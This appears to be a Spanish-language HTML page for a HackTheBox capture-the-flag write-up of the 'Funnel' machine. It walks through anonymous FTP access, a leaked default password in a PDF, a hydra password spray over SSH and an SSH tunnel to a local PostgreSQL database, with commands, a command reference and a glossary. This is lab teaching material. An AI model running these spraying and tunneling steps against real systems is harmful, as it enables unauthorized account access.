@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; script-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; base-uri 'self'; form-action 'none'; object-src 'none'">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <title>Funnel — HackTheBox Writeup | Brandeiks</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <meta name="description" content="Writeup de la máquina Funnel de HackTheBox (Linux, Muy Fácil): FTP anónimo filtra usuarios y una contraseña por defecto en un PDF, hydra la encuentra válida para christine por SSH, y un túnel SSH llega al PostgreSQL local con la flag.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="canonical" href="https://brandeiks.github.io/writeups/hackthebox/muy-facil/funnel.html">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="Brandeiks">
+  <meta property="og:title" content="Funnel — HackTheBox Writeup | Brandeiks">
+  <meta property="og:description" content="Writeup de la máquina Funnel de HackTheBox (Linux, Muy Fácil): FTP anónimo filtra usuarios y una contraseña por defecto en un PDF, hydra la encuentra válida para christine por SSH, y un túnel SSH llega al PostgreSQL local con la flag.">
+  <meta property="og:url" content="https://brandeiks.github.io/writeups/hackthebox/muy-facil/funnel.html">
+  <meta property="og:image" content="https://brandeiks.github.io/assets/og/funnel.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:locale" content="es_ES">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Funnel — HackTheBox Writeup | Brandeiks">
+  <meta name="twitter:description" content="Writeup de la máquina Funnel de HackTheBox (Linux, Muy Fácil): FTP anónimo filtra usuarios y una contraseña por defecto en un PDF, hydra la encuentra válida para christine por SSH, y un túnel SSH llega al PostgreSQL local con la flag.">
+  <meta name="twitter:image" content="https://brandeiks.github.io/assets/og/funnel.png">
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Funnel — HackTheBox Writeup | Brandeiks", "description": "Writeup de la máquina Funnel de HackTheBox (Linux, Muy Fácil): FTP anónimo filtra usuarios y una contraseña por defecto en un PDF, hydra la encuentra válida para christine por SSH, y un túnel SSH llega al PostgreSQL local con la flag.", "inLanguage": "es", "url": "https://brandeiks.github.io/writeups/hackthebox/muy-facil/funnel.html", "image": "https://brandeiks.github.io/assets/og/funnel.png", "author": {"@type": "Person", "name": "Brandon Zevallos Pastrana", "url": "https://brandeiks.github.io/"}, "publisher": {"@type": "Organization", "name": "Brandeiks", "url": "https://brandeiks.github.io/"}, "mainEntityOfPage": {"@type": "WebPage", "@id": "https://brandeiks.github.io/writeups/hackthebox/muy-facil/funnel.html"}}</script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="../../../assets/writeups.css">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;900&display=swap" rel="stylesheet"/>
+  <style>
+    /* FOOTER */
+
+    @media (max-width: 1024px) {
+      .writeup-layout { grid-template-columns: 1fr; }
+      .sidebar { position: static; order: -1; display: flex; gap: 1rem; flex-wrap: wrap; }
+      .sidebar-box { flex: 1; min-width: 200px; margin-bottom: 0; }
+    }
+    @media (max-width: 768px) {
+      nav { padding: 1rem 1.5rem; }
+      .writeup-hero { padding: 6rem 1.5rem 2.5rem; }
+      .writeup-layout { padding: 2rem 1.5rem; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+
+        /* NAV RESPONSIVE */
+    @media (max-width: 900px) {
+      nav { padding: 0.7rem 1rem; }
+      .nav-logo { font-size: 0.85rem; letter-spacing: 2px; }
+      .nav-back { font-size: 0.68rem; margin-left: 0.8rem; }
+    }
+    @media (max-width: 700px) {
+      nav { flex-wrap: wrap; justify-content: space-between; row-gap: 0; padding: 0.6rem 1rem; }
+      .nav-logo { font-size: 0.82rem; letter-spacing: 1px; }
+      .menu-btn {
+        display: flex; align-items: center; justify-content: center;
+        width: 40px; height: 34px; cursor: pointer;
+        border: 1px solid var(--dim); border-radius: 3px;
+      }
+      .menu-btn span, .menu-btn span::before, .menu-btn span::after {
+        display: block; width: 18px; height: 2px; background: var(--green);
+        transition: transform 0.25s, opacity 0.25s;
+      }
+      .menu-btn span { position: relative; }
+      .menu-btn span::before, .menu-btn span::after { content: ''; position: absolute; left: 0; }
+      .menu-btn span::before { top: -6px; }
+      .menu-btn span::after { top: 6px; }
+      .menu-check:checked ~ nav .menu-btn span { background: transparent; }
+      .menu-check:checked ~ nav .menu-btn span::before { transform: translateY(6px) rotate(45deg); }
+      .menu-check:checked ~ nav .menu-btn span::after { transform: translateY(-6px) rotate(-45deg); }
+      .nav-back { display: none; }
+      .menu-check:checked ~ nav .nav-back {
+        display: block; width: 100%; text-align: center;
+        margin: 0; padding: 0.7rem 0; font-size: 0.78rem;
+        border-top: 1px solid var(--dim);
+      }
+    }
+    @media (max-width: 480px) {
+      nav { padding: 0.55rem 0.8rem; }
+      .nav-logo { font-size: 0.76rem; }
+      .menu-check:checked ~ nav .nav-back { font-size: 0.72rem; padding: 0.6rem 0; }
+          footer { flex-direction: column; gap: 0.8rem; text-align: center; padding: 1.5rem; }
+}
+  </style>
+</head>
+<body>
+
+<a href="#main" class="skip-link">Saltar al contenido</a>
+<noscript><div class="aviso-noscript"><strong>JavaScript desactivado:</strong> la navegación entre writeups, el modo guion, el zoom de capturas y el progreso de lectura necesitan JavaScript. El contenido del writeup, los comandos y los enlaces del índice funcionan igualmente.</div></noscript>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+
+<!-- NAV -->
+<input type="checkbox" id="menuAbierto" class="menu-check" aria-hidden="true">
+<nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <label for="menuAbierto" class="menu-btn" aria-label="Abrir menú"><span></span></label>
+    <a href="../../../index.html" class="nav-back">INICIO</a>
+    <a href="../../../videos/index.html" class="nav-back">VÍDEOS</a>
+    <a href="../../../writeups/index.html" class="nav-back">WRITEUPS</a>
+    <a href="../../../herramientas/index.html" class="nav-back">HERRAMIENTAS</a>
+    <a href="../../../certificaciones.html" class="nav-back">CERTIFICACIONES</a>
+  </nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">writeups</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
+      <span>funnel</span>
+    </div>
+    <h1 class="writeup-title">FUN<span>NEL</span></h1>
+    <p class="writeup-subtitle">// PDF con contraseña por defecto → spray SSH → túnel → flag en PostgreSQL</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-muy-facil">● MUY FÁCIL</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-ftp">FTP ANÓNIMO</span>
+      <span class="meta-badge badge-hydra">PASSWORD SPRAY</span>
+      <span class="meta-badge badge-db">POSTGRESQL</span>
+      <span class="meta-date">📅 Octubre 2026 · Por Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#recon">01 · FTP y filtración</a></li>
+        <li><a href="#spray">02 · Password spray SSH</a></li>
+        <li><a href="#tunel">03 · Túnel y PostgreSQL</a></li>
+        <li><a href="#cmdref">04 · Referencia Comandos</a></li>
+        <li><a href="#glosario">05 · Glosario</a></li>
+      </ul>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO MÁQUINA</p>
+      <div class="info-row"><span class="info-label">NOMBRE</span><span class="info-val val-cyan">Funnel</span></div>
+      <div class="info-row"><span class="info-label">SISTEMA</span><span class="info-val val-cyan">Linux (Ubuntu)</span></div>
+      <div class="info-row"><span class="info-label">DIFICULTAD</span><span class="info-val val-muy-facil">Muy Fácil</span></div>
+      <div class="info-row"><span class="info-label">PLATAFORMA</span><span class="info-val val-yellow">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">SERVICIO</span><span class="info-val val-yellow">FTP + SSH + PostgreSQL local</span></div>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">FTP anónimo → <span>mail_backup/</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">usuarios + PDF → <span>funnel123#!#</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">hydra → <span>christine</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">túnel SSH → <span>5432 local</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">BD <span>secrets.flag</span></div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- MAIN CONTENT -->
+  <main id="main" class="writeup-content">
+    <!-- ===================== 01 FTP Y FILTRACIÓN ===================== -->
+    <div class="section" id="recon">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">FTP y filtración</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">RECONOCIMIENTO</span>
+      </div>
+      <div class="cmd-block" data-cmd="sudo nmap -sS -p- -n -Pn --min-rate 3000 --max-retries 1 --open 10.129.228.195">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">NMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-sS -p- -n -Pn --min-rate</span> <span class="arg">3000</span> <span class="flag">--max-retries</span> <span class="arg">1</span> <span class="flag">--open</span> <span class="arg">10.129.228.195</span></span></div>
+      </div>
+      <div class="output-block">
+        <div><span class="o-green">21/tcp open  ftp</span></div>
+        <div><span class="o-green">22/tcp open  ssh</span></div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// NOTA</p>
+        <p>Sin puerto web: con solo FTP y SSH abiertos, el primer sitio a mirar es siempre el FTP, por si acepta acceso anónimo.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">EXPLORAR EL FTP ANÓNIMO</span>
+      </div>
+      <div class="cmd-block" data-cmd="curl -s --user anonymous:anonymous ftp://10.129.228.195/mail_backup/; curl -s -O --user anonymous:anonymous 'ftp://10.129.228.195/mail_backup/welcome_28112022'; cat welcome_28112022">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">FTP</span>
+        <div><span class="prompt">$ </span><span class="cmd">curl <span class="flag">-s --user</span> <span class="arg">anonymous:anonymous</span> <span class="arg">ftp://10.129.228.195/mail_backup/</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">curl <span class="flag">-s -O --user</span> <span class="arg">anonymous:anonymous</span> <span class="arg">'ftp://10.129.228.195/mail_backup/welcome_28112022'</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>password_policy.pdf   welcome_28112022</div>
+        <div>To: <span class="o-green">optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">LA CONTRASEÑA POR DEFECTO, EN EL PROPIO PDF</span>
+      </div>
+      <div class="cmd-block" data-cmd="curl -s -O --user anonymous:anonymous 'ftp://10.129.228.195/mail_backup/password_policy.pdf'; pdftotext password_policy.pdf - | grep -i default">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">PDFTOTEXT</span>
+        <div><span class="prompt">$ </span><span class="cmd">pdftotext <span class="arg">password_policy.pdf -</span> | grep <span class="flag">-i</span> <span class="arg">default</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>... the default password of "<span class="o-green">funnel123#!#</span>" must be changed immediately.</div>
+      </div>
+      <div class="vuln-box">
+        <p class="vuln-box-title">// FILTRACIÓN POR DOCUMENTOS INTERNOS</p>
+        <p>
+          <strong>Dónde:</strong> un FTP anónimo que expone correos y documentación interna.<br>
+          <strong>Qué permite:</strong> el correo de bienvenida da <strong>cinco usuarios reales</strong> y el PDF de
+          política de contraseñas publica, sin querer, la <strong>contraseña por defecto</strong> que se supone deben
+          cambiar.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 02 PASSWORD SPRAY SSH ===================== -->
+    <div class="section" id="spray">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Password spray SSH</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">PROBAR LA MISMA CONTRASEÑA EN LOS CINCO USUARIOS</span>
+      </div>
+      <div class="cmd-block" data-cmd="printf 'optimus\nalbert\nandreas\nchristine\nmaria\n' > users.txt; hydra -L users.txt -p 'funnel123#!#' ssh://10.129.228.195 -t 4">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">HYDRA</span>
+        <div><span class="prompt">$ </span><span class="cmd">printf <span class="arg">'optimus\nalbert\nandreas\nchristine\nmaria\n'</span> &gt; <span class="arg">users.txt</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">hydra <span class="flag">-L</span> <span class="arg">users.txt</span> <span class="flag">-p</span> <span class="arg">'funnel123#!#'</span> <span class="arg">ssh://10.129.228.195</span> <span class="flag">-t</span> <span class="arg">4</span></span></div>
+      </div>
+      <div class="output-block">
+        <div><span class="o-green">[22][ssh] host: 10.129.228.195   login: christine   password: funnel123#!#</span></div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// NOTA: SPRAY, NO FUERZA BRUTA</p>
+        <p>
+          Es <strong>password spraying</strong>: una sola contraseña contra varios usuarios, no un diccionario grande
+          contra uno solo. De los cinco, solo <code>christine</code> nunca cambió la contraseña inicial.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 03 TÚNEL Y POSTGRESQL ===================== -->
+    <div class="section" id="tunel">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Túnel y PostgreSQL</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">VER QUÉ ESCUCHA SOLO EN LOCALHOST</span>
+      </div>
+      <div class="cmd-block" data-cmd="sshpass -p 'funnel123#!#' ssh christine@10.129.228.195 'ss -tlnp'">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">SSH</span>
+        <div><span class="prompt">$ </span><span class="cmd">sshpass <span class="flag">-p</span> <span class="arg">'funnel123#!#'</span> ssh <span class="arg">christine@10.129.228.195</span> <span class="arg">'ss -tlnp'</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>LISTEN  0.0.0.0:21</div>
+        <div>LISTEN  0.0.0.0:22</div>
+        <div><span class="o-yellow">LISTEN  127.0.0.1:5432</span>   <span class="comment"># PostgreSQL, solo local</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">TUNELIZAR EL 5432</span>
+      </div>
+      <div class="cmd-block" data-cmd="setsid sshpass -p 'funnel123#!#' ssh -N -L 5432:127.0.0.1:5432 christine@10.129.228.195 &">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">SSH TUNNEL</span>
+        <div><span class="prompt">$ </span><span class="cmd">setsid sshpass <span class="flag">-p</span> <span class="arg">'funnel123#!#'</span> ssh <span class="flag">-N -L</span> <span class="arg">5432:127.0.0.1:5432</span> <span class="arg">christine@10.129.228.195</span> &amp;</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">LEER LA FLAG EN LA BASE DE DATOS</span>
+      </div>
+      <div class="cmd-block" data-cmd="export PGPASSWORD='funnel123#!#'; psql -h 127.0.0.1 -p 5432 -U christine -d secrets -c 'select * from flag;'">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">PSQL</span>
+        <div><span class="prompt">$ </span><span class="cmd">export PGPASSWORD=<span class="arg">'funnel123#!#'</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">psql <span class="flag">-h</span> <span class="arg">127.0.0.1</span> <span class="flag">-p</span> <span class="arg">5432</span> <span class="flag">-U</span> <span class="arg">christine</span> <span class="flag">-d</span> <span class="arg">secrets</span> <span class="flag">-c</span> <span class="arg">'select * from flag;'</span></span></div>
+      </div>
+      <div class="output-block">
+        <div><span class="o-green">[flag oculta]</span></div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// FLAG</p>
+        <p>
+          <strong>[flag oculta]</strong> — en la tabla <code>flag</code> de la base <code>secrets</code>.
+          Esta instancia no tiene <code>user.txt</code>/<code>root.txt</code> en disco: es la única flag del reto.
+          Ruta completa: FTP anónimo → usuarios + contraseña por defecto → hydra (christine) → túnel SSH → PostgreSQL →
+          flag. Tiempo total: breve, sin pasos de escalada.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 04 CMD REF ===================== -->
+    <div class="section" id="cmdref">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Referencia Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">curl ftp://</div>
+          <div class="cmd-ref-syntax">curl --user usuario:pass ftp://IP/ruta</div>
+          <div class="cmd-ref-desc">Navega y descarga de un servidor FTP sin necesitar el cliente interactivo.</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">pdftotext</div>
+          <div class="cmd-ref-syntax">pdftotext archivo.pdf -</div>
+          <div class="cmd-ref-desc">Extrae el texto de un PDF a la salida estándar, útil para buscar credenciales filtradas en documentos (paquete <code>poppler-utils</code>).</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">hydra -L / -p</div>
+          <div class="cmd-ref-syntax">hydra -L usuarios.txt -p 'contraseña' ssh://IP -t 4</div>
+          <div class="cmd-ref-desc">Prueba una única contraseña contra una lista de usuarios (password spray), al revés que una fuerza bruta clásica.</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">ss -tlnp</div>
+          <div class="cmd-ref-syntax">ss -tlnp</div>
+          <div class="cmd-ref-desc">Lista los sockets TCP en escucha y en qué dirección (0.0.0.0 vs 127.0.0.1), clave para detectar servicios internos.</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">ssh -L (túnel local)</div>
+          <div class="cmd-ref-syntax">ssh -N -L puerto_local:127.0.0.1:puerto_remoto usuario@IP</div>
+          <div class="cmd-ref-desc">Reenvía un puerto solo accesible en localhost de la víctima hacia la máquina del atacante, a través del túnel SSH.</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">psql</div>
+          <div class="cmd-ref-syntax">psql -h host -p puerto -U usuario -d base -c 'SQL'</div>
+          <div class="cmd-ref-desc">Cliente de PostgreSQL; con <code>PGPASSWORD</code> exportada evita que pida la contraseña de forma interactiva.</div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- ===================== 05 GLOSARIO ===================== -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">Password spraying</div>
+          <div class="glos-def">
+            Técnica que prueba una o pocas contraseñas comunes contra muchos usuarios, en vez de muchas contraseñas
+            contra un solo usuario. Es más silenciosa frente a bloqueos por intentos fallidos.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">FTP anónimo</div>
+          <div class="glos-def">
+            Configuración que permite iniciar sesión FTP sin credenciales reales. A menudo deja al descubierto backups,
+            documentos internos o correos olvidados.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Túnel SSH (port forwarding local)</div>
+          <div class="glos-def">
+            Uso de una conexión SSH para reenviar un puerto que solo escucha en <code>localhost</code> de la víctima
+            hacia la máquina del atacante, sin exponerlo en la red.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Servicio ligado a localhost (127.0.0.1)</div>
+          <div class="glos-def">
+            Un servicio que solo acepta conexiones desde la propia máquina. No es inaccesible por completo: cualquiera
+            con una shell o un túnel en esa máquina sí puede llegar a él.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">PostgreSQL</div>
+          <div class="glos-def">
+            Sistema de gestión de bases de datos relacional de código abierto. Su cliente estándar es <code>psql</code>,
+            y su puerto por defecto es el 5432.
+          </div>
+        </div>
+
+      </div>
+    </div>
+  <div class="writeup-nav" aria-label="Navegación entre writeups"><a class="anterior" href="pennyworth.html"><span class="dir">← ANTERIOR</span><span class="nombre">Pennyworth</span></a><a class="siguiente" href="bike.html"><span class="dir">SIGUIENTE →</span><span class="nombre">Bike</span></a></div>
+<section class="relacionados"><h2>// RELACIONADOS POR ETIQUETAS</h2><div class="rel-grid"><a class="rel-card" href="crocodile.html"><span class="nombre">Crocodile</span><span class="meta">hackthebox · muy-facil · FTP · Credenciales</span></a><a class="rel-card" href="bike.html"><span class="nombre">Bike</span><span class="meta">hackthebox · muy-facil · SSTI</span></a></div></section>
+</main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup de Funnel · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+<script id="datos-writeup" type="application/json">{"nombre": "FUNNEL", "plataforma": "hackthebox", "dificultad": "muy-facil", "url": "https://brandeiks.github.io/writeups/hackthebox/muy-facil/funnel.html"}</script>
+<script src="../../../assets/cursor.js" defer></script>
+<script src="../../../assets/writeup.js" defer></script>
+</body>
+</html>
